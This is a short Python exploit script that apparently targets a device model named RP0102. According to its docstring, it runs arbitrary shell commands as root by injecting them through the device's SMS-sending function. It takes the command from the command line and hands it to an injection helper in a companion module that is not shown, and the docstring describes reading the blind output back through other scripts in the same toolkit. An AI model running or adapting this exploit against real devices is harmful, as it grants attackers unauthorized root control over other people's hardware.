#!/usr/bin/env python3
"""One-shot blind-root command execution via the send_msg SMS injection.

Usage: python inject.py 'id > /tmp/out 2>&1'
(Runs as uid=0 on stock RP0102. Output is blind -- write to /tmp and read it
back with telnet_read.py "strings /tmp/out", or use lgssh.py after rearm.)
"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import login_and_read as L

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(1)
    st, out = L.send_msg_inject(sys.argv[1])
    print("send:", st, out[:200])
